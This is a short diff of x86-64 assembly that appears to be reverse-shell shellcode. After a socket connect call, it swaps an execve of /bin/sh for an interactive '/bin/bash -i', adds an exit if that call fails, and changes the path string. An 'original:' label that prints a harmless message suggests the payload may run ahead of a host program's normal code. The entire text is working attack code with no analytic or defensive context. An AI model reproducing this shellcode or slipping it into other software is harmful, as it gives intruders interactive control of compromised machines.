@@ -47,16 +47,6 @@ _start:
     mov rdx, 16 ; socklen = 16
     syscall
 
-    ; execve("/bin/sh", ["/bin/sh", null], null)
-    xor rax, rax
-    push rax ; argv[1] = null
-    lea rdi, [rel path]
-    push rdi ; argv[0] = "/bin/sh"
-    mov rsi, rsp
-    xor rdx, rdx
-    mov rax, 59 ; sys_execve = 59
-    syscall
-
     ; execve("/bin/bash", ["/bin/bash", "-i", null], null)
     xor rax, rax
     push rax ; argv[2] = null
@@ -67,6 +57,12 @@ _start:
     mov rsi, rsp
     xor rdx, rdx
     mov rax, 59 ; sys_execve = 59
+    syscall
+
+    ; if execve failed exit
+    mov rax, 60
+    xor rdi, rdi
+    syscall
  
 original:
     ; sys_write
@@ -83,7 +79,7 @@ text:
     db "is it dead beef or steak", 0x0A
 
 path:
-    db "/bin/sh", 0
+    db "/bin/bash", 0
 
 flag:
     db "-i", 0
